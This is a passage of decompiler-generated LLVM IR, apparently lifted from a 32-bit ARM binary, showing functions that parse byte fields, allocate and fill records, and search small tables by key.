  br i1 %tmp33, label %dec_label_pc_8344, label %dec_label_pc_8338

dec_label_pc_8338:                                ; preds = %dec_label_pc_8320
  %v7_8338 = icmp eq i32 %arg2, 4
  store i1 %v7_8338, i1* %cpsr_z.global-to-local, align 1
  %v1_833c = inttoptr i32 %v0_8330 to i32*
  %v2_833c = load i32, i32* %v1_833c, align 4
  store i32 %v2_833c, i32* @sl, align 4
  br i1 %v7_8338, label %dec_label_pc_8344, label %dec_label_pc_834c

dec_label_pc_8344:                                ; preds = %dec_label_pc_8368, %.dec_label_pc_8344_crit_edge, %dec_label_pc_8338, %dec_label_pc_835c, %dec_label_pc_834c, %dec_label_pc_8320
  %v29_8348 = phi i32 [ %v29_8348.pre, %.dec_label_pc_8344_crit_edge ], [ %v0_8330, %dec_label_pc_8368 ], [ %v0_8330, %dec_label_pc_8338 ], [ %v0_8330, %dec_label_pc_835c ], [ %v0_8330, %dec_label_pc_834c ], [ %v0_8330, %dec_label_pc_8320 ]
  store i32 %v6_8320, i32* @r5, align 4
  store i32 %v9_8320, i32* @r6, align 4
  store i32 %v12_8320, i32* @r7, align 4
  store i32 %v18_8320, i32* @sb, align 4
  store i32 %v21_8320, i32* @sl, align 4
  ret i32 %v29_8348

dec_label_pc_834c:                                ; preds = %dec_label_pc_8338
  %v7_834c = icmp eq i32 %arg2, 5
  store i1 %v7_834c, i1* %cpsr_z.global-to-local, align 1
  %v1_8350 = add i32 %v0_8330, 4
  %v2_8350 = inttoptr i32 %v1_8350 to i8*
  %v3_8350 = load i8, i8* %v2_8350, align 1
  %v4_8350 = zext i8 %v3_8350 to i32
  store i32 %v4_8350, i32* %r1.global-to-local, align 4
  br i1 %v7_834c, label %dec_label_pc_8344, label %dec_label_pc_835c

dec_label_pc_835c:                                ; preds = %dec_label_pc_834c
  %v1_835c = add i32 %v0_8330, 5
  %v2_835c = inttoptr i32 %v1_835c to i8*
  %v3_835c = load i8, i8* %v2_835c, align 1
  %v4_835c = zext i8 %v3_835c to i32
  store i32 %v4_835c, i32* @r7, align 4
  %v2_8360 = icmp eq i8 %v3_835c, 0
  store i1 %v2_8360, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8360, label %dec_label_pc_8344, label %dec_label_pc_8368

dec_label_pc_8368:                                ; preds = %dec_label_pc_835c
  %v3_8368 = mul nuw nsw i32 %v4_835c, 4
  store i32 %v3_8368, i32* @sb, align 4
  %v1_836c = add i32 %arg2, -6
  store i32 %v1_836c, i32* @r6, align 4
  %v2_8370 = mul nuw nsw i32 %v4_835c, 5
  store i32 %v2_8370, i32* @r8, align 4
  %v3_8374 = icmp ult i32 %v1_836c, %v2_8370
  %v9_8374 = icmp eq i32 %v1_836c, %v2_8370
  store i1 %v9_8374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8374, label %dec_label_pc_8344, label %dec_label_pc_837c

dec_label_pc_837c:                                ; preds = %dec_label_pc_8368
  store i32 %v4_835c, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  %v2_8384 = call i32 @function_126cc(i32 %v4_835c, i32 24)
  store i32 %v2_8384, i32* %r0.global-to-local, align 4
  %v0_8388 = load i32, i32* @r7, align 4
  %v2_8388 = icmp eq i32 %v0_8388, 0
  store i1 %v2_8388, i1* %cpsr_z.global-to-local, align 1
  %v0_8390 = load i32, i32* @r4, align 4
  %v1_8390 = add i32 %v0_8390, 6
  store i32 %v1_8390, i32* %fp.global-to-local, align 4
  %tmp27 = icmp slt i32 %v0_8388, 1
  br i1 %tmp27, label %dec_label_pc_83e8thread-pre-split, label %dec_label_pc_8398

dec_label_pc_8398:                                ; preds = %dec_label_pc_837c
  store i32 %v2_8384, i32* %r1.global-to-local, align 4
  %v1_839c = load i32, i32* @r8, align 4
  %v2_839c = add i32 %v1_839c, %v0_8390
  store i32 %v2_839c, i32* %ip.global-to-local, align 4
  store i32 %v0_8390, i32* %r0.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_83ac

dec_label_pc_83ac:                                ; preds = %dec_label_pc_83ac.dec_label_pc_83ac_crit_edge, %dec_label_pc_8398
  %v2_83bc = phi i32 [ %v1_83d0, %dec_label_pc_83ac.dec_label_pc_83ac_crit_edge ], [ %v2_8384, %dec_label_pc_8398 ]
  %v1_83b8 = phi i32 [ %v1_83b8.pre, %dec_label_pc_83ac.dec_label_pc_83ac_crit_edge ], [ %v2_839c, %dec_label_pc_8398 ]
  %v0_83b4 = phi i32 [ %v0_83ac.pre, %dec_label_pc_83ac.dec_label_pc_83ac_crit_edge ], [ %v0_8390, %dec_label_pc_8398 ]
  %v1_83ac = add i32 %v0_83b4, 10
  %v2_83ac = inttoptr i32 %v1_83ac to i8*
  %v3_83ac = load i8, i8* %v2_83ac, align 1
  %v1_83b0 = add i32 %v0_83b4, 6
  %v2_83b0 = inttoptr i32 %v1_83b0 to i32*
  %v3_83b0 = load i32, i32* %v2_83b0, align 4
  store i32 %v3_83b0, i32* %r2.global-to-local, align 4
  %v1_83b4 = add i32 %v0_83b4, 5
  store i32 %v1_83b4, i32* %r0.global-to-local, align 4
  %v9_83b8 = icmp eq i32 %v1_83b4, %v1_83b8
  store i1 %v9_83b8, i1* %cpsr_z.global-to-local, align 1
  %v3_83bc = add i32 %v2_83bc, 20
  %v4_83bc = inttoptr i32 %v3_83bc to i8*
  store i8 %v3_83ac, i8* %v4_83bc, align 1
  %v0_83c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_83c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_83c0 = add i32 %v1_83c0, 4
  %v3_83c0 = inttoptr i32 %v2_83c0 to i32*
  store i32 %v0_83c0, i32* %v3_83c0, align 4
  %v0_83c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_83c4 = load i32, i32* %r1.global-to-local, align 4
  %v2_83c4 = add i32 %v1_83c4, 16
  %v3_83c4 = inttoptr i32 %v2_83c4 to i32*
  store i32 %v0_83c4, i32* %v3_83c4, align 4
  %v0_83c8 = load i32, i32* @r4, align 4
  %v1_83c8 = trunc i32 %v0_83c8 to i8
  %v2_83c8 = load i32, i32* %r1.global-to-local, align 4
  %v3_83c8 = inttoptr i32 %v2_83c8 to i8*
  store i8 %v1_83c8, i8* %v3_83c8, align 1
  %v0_83cc = load i32, i32* @lr, align 4
  %v1_83cc = trunc i32 %v0_83cc to i8
  %v2_83cc = load i32, i32* %r1.global-to-local, align 4
  %v3_83cc = add i32 %v2_83cc, 1
  %v4_83cc = inttoptr i32 %v3_83cc to i8*
  store i8 %v1_83cc, i8* %v4_83cc, align 1
  %v0_83d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_83d0 = add i32 %v0_83d0, 24
  store i32 %v1_83d0, i32* %r1.global-to-local, align 4
  %v0_83d4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_83d4, label %dec_label_pc_83d8, label %dec_label_pc_83ac.dec_label_pc_83ac_crit_edge

dec_label_pc_83ac.dec_label_pc_83ac_crit_edge:    ; preds = %dec_label_pc_83ac
  %v0_83ac.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_83b8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_83ac

dec_label_pc_83d8:                                ; preds = %dec_label_pc_83ac
  %v0_83d8 = load i32, i32* @sb, align 4
  %v1_83d8 = load i32, i32* @r7, align 4
  %v1_83dc = load i32, i32* @r5, align 4
  %sum = add i32 %v1_83d8, %v0_83d8
  %v2_83dc = sub i32 %v1_83dc, %sum
  %v0_83e0 = load i32, i32* %r0.global-to-local, align 4
  %v1_83e0 = add i32 %v0_83e0, 6
  store i32 %v1_83e0, i32* %fp.global-to-local, align 4
  %v1_83e4 = add i32 %v2_83dc, -6
  store i32 %v1_83e4, i32* @r6, align 4
  br label %dec_label_pc_83e8

dec_label_pc_83e8thread-pre-split:                ; preds = %dec_label_pc_837c
  %v0_83e8.pr = load i32, i32* @r6, align 4
  br label %dec_label_pc_83e8

dec_label_pc_83e8:                                ; preds = %dec_label_pc_83e8thread-pre-split, %dec_label_pc_83d8
  %v0_83f4 = phi i32 [ %v1_8390, %dec_label_pc_83e8thread-pre-split ], [ %v1_83e0, %dec_label_pc_83d8 ]
  %v1_83ec = phi i32 [ %v0_83e8.pr, %dec_label_pc_83e8thread-pre-split ], [ %v1_83e4, %dec_label_pc_83d8 ]
  %v2_83e8 = icmp eq i32 %v1_83ec, 0
  store i1 %v2_83e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_83e8, label %dec_label_pc_8520, label %dec_label_pc_83f4

dec_label_pc_83f4:                                ; preds = %dec_label_pc_83e8
  %v1_83f4 = inttoptr i32 %v0_83f4 to i8*
  %v2_83f4 = load i8, i8* %v1_83f4, align 1
  %v3_83f4 = zext i8 %v2_83f4 to i32
  store i32 %v3_83f4, i32* @sb, align 4
  %v2_83f8 = icmp eq i8 %v2_83f4, 0
  store i1 %v2_83f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_83f8, label %dec_label_pc_84d8, label %dec_label_pc_8408

dec_label_pc_8408:                                ; preds = %dec_label_pc_83f4
  store i32 %v3_83f4, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_8410 = call i32 @function_126cc(i32 %v3_83f4, i32 8)
  store i32 %v2_8410, i32* %r0.global-to-local, align 4
  %v0_8414 = load i32, i32* @sb, align 4
  %v2_8414 = icmp eq i32 %v0_8414, 0
  store i1 %v2_8414, i1* %cpsr_z.global-to-local, align 1
  %tmp28 = icmp slt i32 %v0_8414, 1
  br i1 %tmp28, label %dec_label_pc_84d8, label %dec_label_pc_8424

dec_label_pc_8424:                                ; preds = %dec_label_pc_8408
  %v0_8424 = load i32, i32* @r6, align 4
  %v1_8424 = add i32 %v0_8424, -1
  store i32 %v1_8424, i32* %r2.global-to-local, align 4
  %v7_8424 = icmp eq i32 %v0_8424, 1
  store i1 %v7_8424, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8424, label %dec_label_pc_8520, label %dec_label_pc_842c

dec_label_pc_842c:                                ; preds = %dec_label_pc_8424
  %v0_842c = load i32, i32* %fp.global-to-local, align 4
  %v1_842c = add i32 %v0_842c, 1
  %v2_842c = inttoptr i32 %v1_842c to i8*
  %v3_842c = load i8, i8* %v2_842c, align 1
  %v1_8430 = add i32 %v0_8424, -2
  store i32 %v1_8430, i32* %r2.global-to-local, align 4
  %v7_8430 = icmp eq i32 %v1_8424, 1
  store i1 %v7_8430, i1* %cpsr_z.global-to-local, align 1
  %v3_8434 = add i32 %v2_8410, 4
  %v4_8434 = inttoptr i32 %v3_8434 to i8*
  store i8 %v3_842c, i8* %v4_8434, align 1
  %v0_8438 = load i32, i32* %fp.global-to-local, align 4
  %v1_8438 = add i32 %v0_8438, 1
  store i32 %v1_8438, i32* %r0.global-to-local, align 4
  %v0_843c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_843c, label %dec_label_pc_8520, label %dec_label_pc_8440

dec_label_pc_8440:                                ; preds = %dec_label_pc_842c
  %v1_8440 = add i32 %v0_8438, 2
  %v2_8440 = inttoptr i32 %v1_8440 to i8*
  %v3_8440 = load i8, i8* %v2_8440, align 1
  %v4_8440 = zext i8 %v3_8440 to i32
  store i32 %v4_8440, i32* @r4, align 4
  %v0_8444 = load i32, i32* %r2.global-to-local, align 4
  %v1_8444 = add i32 %v0_8444, -1
  store i32 %v1_8444, i32* @r8, align 4
  %v9_8448 = icmp eq i32 %v1_8444, %v4_8440
  store i1 %v9_8448, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8440, i32* %r0.global-to-local, align 4
  %v5_8450 = icmp slt i32 %v1_8444, %v4_8440
  br i1 %v5_8450, label %dec_label_pc_8520, label %dec_label_pc_8454

dec_label_pc_8454:                                ; preds = %dec_label_pc_8440
  store i32 %v2_8410, i32* @r5, align 4
  %v1_845c = add i32 %v2_8410, 8
  %v1_8460 = add i32 %v0_8438, 3
  store i32 %v1_8460, i32* @r6, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_84a4

dec_label_pc_8470:                                ; preds = %dec_label_pc_84a4
  %v0_8470 = load i32, i32* @r8, align 4
  %v1_8470 = load i32, i32* @r4, align 4
  %v2_8470 = sub i32 %v0_8470, %v1_8470
  store i32 %v2_8470, i32* %r2.global-to-local, align 4
  %v9_8470 = icmp eq i32 %v0_8470, %v1_8470
  store i1 %v9_8470, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8470, label %dec_label_pc_8520, label %dec_label_pc_8478

dec_label_pc_8478:                                ; preds = %dec_label_pc_8470
  %v1_8478 = load i32, i32* @r6, align 4
  %v2_8478 = add i32 %v1_8478, %v1_8470
  %v3_8478 = inttoptr i32 %v2_8478 to i8*
  %v4_8478 = load i8, i8* %v3_8478, align 1
  store i32 %v2_8478, i32* %r0.global-to-local, align 4
  %v1_8480 = add i32 %v2_8470, -1
  store i32 %v1_8480, i32* %r2.global-to-local, align 4
  %v7_8480 = icmp eq i32 %v2_8470, 1
  store i1 %v7_8480, i1* %cpsr_z.global-to-local, align 1
  %v3_8484 = add i32 %v2_8484, 4
  %v4_8484 = inttoptr i32 %v3_8484 to i8*
  store i8 %v4_8478, i8* %v4_8484, align 1
  %v0_8488 = load i32, i32* %r0.global-to-local, align 4
  %v0_848c = load i32, i32* %r2.global-to-local, align 4
  %v1_848c = add i32 %v0_848c, -1
  store i32 %v1_848c, i32* @r8, align 4
  %v1_8490 = add i32 %v0_8488, 2
  store i32 %v1_8490, i32* @r6, align 4
  %v0_8494 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8494, label %dec_label_pc_8520, label %dec_label_pc_8498

dec_label_pc_8498:                                ; preds = %dec_label_pc_8478
  %v1_8488 = add i32 %v0_8488, 1
  %v2_8498 = inttoptr i32 %v1_8488 to i8*
  %v3_8498 = load i8, i8* %v2_8498, align 1
  %v4_8498 = zext i8 %v3_8498 to i32
  store i32 %v4_8498, i32* @r4, align 4
  %v2_849c = sub i32 %v1_848c, %v4_8498
  %tmp30 = sub i32 0, %v2_849c
  %v6_849c = and i32 %v1_848c, %tmp30
  %v7_849c = icmp slt i32 %v6_849c, 0
  %v8_849c = icmp slt i32 %v2_849c, 0
  %v9_849c = icmp eq i32 %v1_848c, %v4_8498
  store i1 %v9_849c, i1* %cpsr_z.global-to-local, align 1
  %v2_84a0 = xor i1 %v8_849c, %v7_849c
  br i1 %v2_84a0, label %dec_label_pc_8520, label %dec_label_pc_84a4

dec_label_pc_84a4:                                ; preds = %dec_label_pc_8498, %dec_label_pc_8454
  %v0_84a8 = phi i32 [ %v4_8440, %dec_label_pc_8454 ], [ %v4_8498, %dec_label_pc_8498 ]
  %v2_8484 = phi i32 [ %v1_845c, %dec_label_pc_8454 ], [ %v1_84c8, %dec_label_pc_8498 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_84a8 = add nuw nsw i32 %v0_84a8, 1
  store i32 %v1_84a8, i32* %r0.global-to-local, align 4
  %v2_84ac = call i32 @function_126cc(i32 %v1_84a8, i32 1)
  store i32 %v2_84ac, i32* %r0.global-to-local, align 4
  %v0_84b0 = load i32, i32* @r6, align 4
  store i32 %v0_84b0, i32* %r1.global-to-local, align 4
  %v1_84b4 = load i32, i32* @r5, align 4
  %v2_84b4 = inttoptr i32 %v1_84b4 to i32*
  store i32 %v2_84ac, i32* %v2_84b4, align 4
  %v0_84b8 = load i32, i32* @r4, align 4
  store i32 %v0_84b8, i32* %r2.global-to-local, align 4
  %v3_84bc = call i32 @function_11268(i32 %v2_84ac, i32 %v0_84b0, i32 %v0_84b8)
  store i32 %v3_84bc, i32* %r0.global-to-local, align 4
  store i32 %v2_8484, i32* @r5, align 4
  %v0_84c4 = load i32, i32* %fp.global-to-local, align 4
  %v1_84c4 = add i32 %v0_84c4, 1
  store i32 %v1_84c4, i32* %fp.global-to-local, align 4
  %v1_84c8 = add i32 %v2_8484, 8
  store i32 %v1_84c8, i32* %ip.global-to-local, align 4
  %v1_84cc = load i32, i32* @sb, align 4
  %v9_84cc = icmp eq i32 %v1_84c4, %v1_84cc
  store i1 %v9_84cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_84cc, label %dec_label_pc_84d8, label %dec_label_pc_8470

dec_label_pc_84d8:                                ; preds = %dec_label_pc_84a4, %dec_label_pc_8408, %dec_label_pc_83f4
  %stack_var_-48.1 = phi i32 [ %v3_83f4, %dec_label_pc_83f4 ], [ %v0_8414, %dec_label_pc_8408 ], [ %v0_8414, %dec_label_pc_84a4 ]
  %stack_var_-52.2 = phi i32 [ %v3_83f4, %dec_label_pc_83f4 ], [ %v2_8410, %dec_label_pc_8408 ], [ %v2_8410, %dec_label_pc_84a4 ]
  %v0_84d8 = call i32 @function_120c4()
  %v0_84dc = load i32, i32* @sl, align 4
  store i32 %stack_var_-48.1, i32* %ip.global-to-local, align 4
  %v3_84e8 = mul i32 %v0_84dc, 16777216
  %v1_84dc = mul i32 %v0_84dc, 256
  %v4_84ec = and i32 %v1_84dc, 16711680
  %v5_84ec = or i32 %v4_84ec, %v3_84e8
  store i32 %v5_84ec, i32* %r1.global-to-local, align 4
  %v1_84e4 = udiv i32 %v0_84dc, 256
  %v3_84f0 = and i32 %v1_84e4, 65280
  store i32 %v3_84f0, i32* %r2.global-to-local, align 4
  %v2_84f8 = inttoptr i32 %v0_84d8 to i32*
  store i32 0, i32* %v2_84f8, align 4
  %v0_84fc = load i32, i32* %r2.global-to-local, align 4
  %v1_84fc = load i32, i32* @sl, align 4
  %v4_84fc = udiv i32 %v1_84fc, 16777216
  %v5_84fc = or i32 %v4_84fc, %v0_84fc
  %v0_8500 = load i32, i32* %ip.global-to-local, align 4
  store i32 %stack_var_-52.2, i32* @ip, align 4
  %v1_8508 = load i32, i32* %r1.global-to-local, align 4
  %v2_8508 = or i32 %v5_84fc, %v1_8508
  store i32 %v2_8508, i32* %r0.global-to-local, align 4
  store i32 %v4_8350, i32* %r1.global-to-local, align 4
  %v0_8514 = load i32, i32* @r7, align 4
  store i32 %v0_8514, i32* %r2.global-to-local, align 4
  %v6_851c = trunc i32 %v0_8500 to i8
  %v7_851c = call i32 @function_8230(i32 %v2_8508, i32 %v4_8350, i32 %v0_8514, i32 %v2_8384, i8 %v6_851c, i32 %stack_var_-52.2)
  store i32 %v7_851c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8520

dec_label_pc_8520:                                ; preds = %dec_label_pc_8498, %dec_label_pc_8478, %dec_label_pc_8470, %dec_label_pc_8440, %dec_label_pc_842c, %dec_label_pc_8424, %dec_label_pc_83e8, %dec_label_pc_84d8
  %stack_var_-52.3 = phi i32 [ 0, %dec_label_pc_83e8 ], [ %stack_var_-52.2, %dec_label_pc_84d8 ], [ %v2_8410, %dec_label_pc_8424 ], [ %v2_8410, %dec_label_pc_842c ], [ %v2_8410, %dec_label_pc_8440 ], [ %v2_8410, %dec_label_pc_8470 ], [ %v2_8410, %dec_label_pc_8478 ], [ %v2_8410, %dec_label_pc_8498 ]
  store i32 %v2_8384, i32* %r1.global-to-local, align 4
  %v2_8524 = icmp eq i32 %v2_8384, 0
  store i1 %v2_8524, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8524, label %bb31, label %bb

bb:                                               ; preds = %dec_label_pc_8520
  store i32 %v2_8384, i32* %r0.global-to-local, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_8520, %bb
  %v1_852c = xor i1 %v2_8524, true
  call void @__pseudo_cond_branch(i1 %v1_852c, i32 ptrtoint (i32* @global_var_12724.25 to i32))
  %v2_8534 = icmp eq i32 %stack_var_-52.3, 0
  store i1 %v2_8534, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8534, label %.dec_label_pc_8344_crit_edge, label %dec_label_pc_853c

.dec_label_pc_8344_crit_edge:                     ; preds = %bb31
  %v29_8348.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8344

dec_label_pc_853c:                                ; preds = %bb31
  %v0_853c = load i32, i32* @sb, align 4
  %v2_853c = icmp eq i32 %v0_853c, 0
  store i1 %v2_853c, i1* %cpsr_z.global-to-local, align 1
  %tmp32 = icmp slt i32 %v0_853c, 1
  br i1 %tmp32, label %dec_label_pc_8564, label %dec_label_pc_8544

dec_label_pc_8544:                                ; preds = %dec_label_pc_853c
  br label %dec_label_pc_8548

dec_label_pc_8548:                                ; preds = %dec_label_pc_8548, %dec_label_pc_8544
  %v0_8554 = phi i32 [ %v1_8554, %dec_label_pc_8548 ], [ 0, %dec_label_pc_8544 ]
  store i32 %stack_var_-52.3, i32* %ip.global-to-local, align 4
  %v4_854c = mul i32 %v0_8554, 8
  %v5_854c = add i32 %v4_854c, %stack_var_-52.3
  %v6_854c = inttoptr i32 %v5_854c to i32*
  %v7_854c = load i32, i32* %v6_854c, align 4
  store i32 %v7_854c, i32* %r0.global-to-local, align 4
  %v2_8550 = icmp eq i32 %v7_854c, 0
  store i1 %v2_8550, i1* %cpsr_z.global-to-local, align 1
  %v1_8554 = add i32 %v0_8554, 1
  %v1_8558 = xor i1 %v2_8550, true
  call void @__pseudo_cond_branch(i1 %v1_8558, i32 ptrtoint (i32* @global_var_12724.25 to i32))
  %v0_855c = load i32, i32* @sb, align 4
  %v9_855c = icmp eq i32 %v0_855c, %v1_8554
  store i1 %v9_855c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_855c, label %dec_label_pc_8564, label %dec_label_pc_8548

dec_label_pc_8564:                                ; preds = %dec_label_pc_8548, %dec_label_pc_853c
  store i32 %stack_var_-52.3, i32* @r0, align 4
  store i32 %v3_8320, i32* @r4, align 4
  store i32 %v6_8320, i32* @r5, align 4
  store i32 %v9_8320, i32* @r6, align 4
  store i32 %v12_8320, i32* @r7, align 4
  store i32 %v15_8320, i32* @r8, align 4
  store i32 %v18_8320, i32* @sb, align 4
  store i32 %v21_8320, i32* @sl, align 4
  store i32 %v27_8320, i32* @lr, align 4
  %v0_8570 = call i32 @function_12724()
  store i32 %v0_8570, i32* %r0.global-to-local, align 4
  ret i32 %v0_8570

; uselistorder directives
  uselistorder i32 %stack_var_-52.3, { 2, 0, 1, 3 }
  uselistorder i32 %v0_84dc, { 2, 0, 1 }
  uselistorder i32 %stack_var_-52.2, { 1, 0, 2 }
  uselistorder i32 %v1_84c8, { 1, 0 }
  uselistorder i32 %v2_8484, { 2, 1, 0 }
  uselistorder i32 %v2_849c, { 1, 0 }
  uselistorder i32 %v4_8498, { 0, 2, 1, 3 }
  uselistorder i32 %v1_848c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8488, { 1, 0 }
  uselistorder i32 %v0_8424, { 0, 2, 1 }
  uselistorder i32 %v0_8414, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8410, { 0, 1, 2, 8, 7, 6, 3, 5, 9, 10, 4, 11 }
  uselistorder i32 %v3_83f4, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_83d0, { 1, 0 }
  uselistorder i32 %v0_83b4, { 0, 2, 1 }
  uselistorder i32 %v0_8390, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8384, { 0, 3, 4, 5, 1, 2, 6 }
  uselistorder i32 %v2_8370, { 2, 1, 0 }
  uselistorder i32 %v4_835c, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v4_8350, { 1, 0, 2 }
  uselistorder i32 %v0_8330, { 5, 6, 0, 1, 2, 3, 4, 7, 8 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 6, 3, 4, 5, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 21, 4, 22, 5, 8, 12, 9, 6, 7, 10, 11, 18, 13, 15, 14, 16, 17, 20, 19, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 4, 5, 3, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32 %arg2, { 1, 4, 5, 0, 3, 2, 6 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_8520, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8344, { 1, 0, 3, 4, 2, 5 }
}

define i32 @function_8574(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_8574:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_8574 = urem i32 %arg1, 256
  %v2_8578 = icmp eq i32 %v1_8574, 0
  %v3_857c = load i32, i32* @r4, align 4
  br i1 %v2_8578, label %dec_label_pc_85c4, label %dec_label_pc_8588

dec_label_pc_8588:                                ; preds = %dec_label_pc_8574
  %v0_8588 = load i32, i32* %r1.global-to-local, align 4
  %v1_8588 = add i32 %v0_8588, 4
  %v2_8588 = inttoptr i32 %v1_8588 to i8*
  %v3_8588 = load i8, i8* %v2_8588, align 1
  %v4_8588 = zext i8 %v3_8588 to i32
  %v1_858c = urem i32 %arg3, 256
  %v9_8590 = icmp eq i32 %v4_8588, %v1_858c
  br i1 %v9_8590, label %dec_label_pc_85cc, label %dec_label_pc_85b4.preheader

dec_label_pc_85b4.preheader:                      ; preds = %dec_label_pc_8588
  br label %dec_label_pc_85b4

dec_label_pc_85a4:                                ; preds = %dec_label_pc_85b4
  %v1_85a4 = add i32 %v0_85ac.in, 12
  %v2_85a4 = inttoptr i32 %v1_85a4 to i8*
  %v3_85a4 = load i8, i8* %v2_85a4, align 1
  %v4_85a4 = zext i8 %v3_85a4 to i32
  %v9_85a8 = icmp eq i32 %v1_858c, %v4_85a4
  br i1 %v9_85a8, label %dec_label_pc_85cc, label %dec_label_pc_85b4

dec_label_pc_85b4:                                ; preds = %dec_label_pc_85b4.preheader, %dec_label_pc_85a4
  %v0_85ac.in = phi i32 [ %v0_8588, %dec_label_pc_85b4.preheader ], [ %v0_85ac, %dec_label_pc_85a4 ]
  %v0_85b4 = phi i32 [ 0, %dec_label_pc_85b4.preheader ], [ %v1_85b4, %dec_label_pc_85a4 ]
  %v0_85ac = add i32 %v0_85ac.in, 8
  %v1_85b4 = add i32 %v0_85b4, 1
  %v9_85b8 = icmp eq i32 %v1_8574, %v1_85b4
  store i32 %v0_85ac, i32* %r1.global-to-local, align 4
  br i1 %v9_85b8, label %dec_label_pc_85c4, label %dec_label_pc_85a4

dec_label_pc_85c4:                                ; preds = %dec_label_pc_85b4, %dec_label_pc_85cc, %dec_label_pc_8574
  store i32 %v3_857c, i32* @r4, align 4
  ret i32 %arg4

dec_label_pc_85cc:                                ; preds = %dec_label_pc_85a4, %dec_label_pc_8588
  %v0_85cc = phi i32 [ %v0_8588, %dec_label_pc_8588 ], [ %v0_85ac, %dec_label_pc_85a4 ]
  %v1_85cc = inttoptr i32 %v0_85cc to i32*
  %v2_85cc = load i32, i32* %v1_85cc, align 4
  store i32 %v2_85cc, i32* @r0, align 4
  %v2_85d0 = icmp eq i32 %v2_85cc, 0
  br i1 %v2_85d0, label %dec_label_pc_85c4, label %dec_label_pc_85d8

dec_label_pc_85d8:                                ; preds = %dec_label_pc_85cc
  store i32 %v3_857c, i32* @r4, align 4
  %v1_85dc = call i32 @function_121ec(i32 %v2_85cc)
  ret i32 %v1_85dc

; uselistorder directives
  uselistorder i32 %v1_85b4, { 1, 0 }
  uselistorder i32 %v0_85ac, { 1, 0, 2 }
  uselistorder i32 %v0_85ac.in, { 1, 0 }
  uselistorder i32 %v1_858c, { 1, 0 }
  uselistorder i32 %v0_8588, { 1, 0, 2 }
  uselistorder i32 %v3_857c, { 1, 0 }
  uselistorder i32 %v1_8574, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_85c4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_85b4, { 1, 0 }
}

define i32 @function_85e0(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_85e0:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_85e0 = urem i32 %arg1, 256
  %v2_85e4 = icmp eq i32 %v1_85e0, 0
  %v3_85e8 = load i32, i32* @r4, align 4
  %v6_85e8 = load i32, i32* @lr, align 4
  br i1 %v2_85e4, label %dec_label_pc_8630, label %dec_label_pc_85f4

dec_label_pc_85f4:                                ; preds = %dec_label_pc_85e0
  %v0_85f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_85f4 = add i32 %v0_85f4, 4
  %v2_85f4 = inttoptr i32 %v1_85f4 to i8*
  %v3_85f4 = load i8, i8* %v2_85f4, align 1
  %v4_85f4 = zext i8 %v3_85f4 to i32
  %v1_85f8 = urem i32 %arg3, 256
  %v9_85fc = icmp eq i32 %v4_85f4, %v1_85f8
  br i1 %v9_85fc, label %dec_label_pc_8638, label %dec_label_pc_8620.preheader

dec_label_pc_8620.preheader:                      ; preds = %dec_label_pc_85f4
  br label %dec_label_pc_8620

dec_label_pc_8610:                                ; preds = %dec_label_pc_8620
  %v1_8610 = add i32 %v0_8618.in, 12
  %v2_8610 = inttoptr i32 %v1_8610 to i8*
  %v3_8610 = load i8, i8* %v2_8610, align 1
  %v4_8610 = zext i8 %v3_8610 to i32
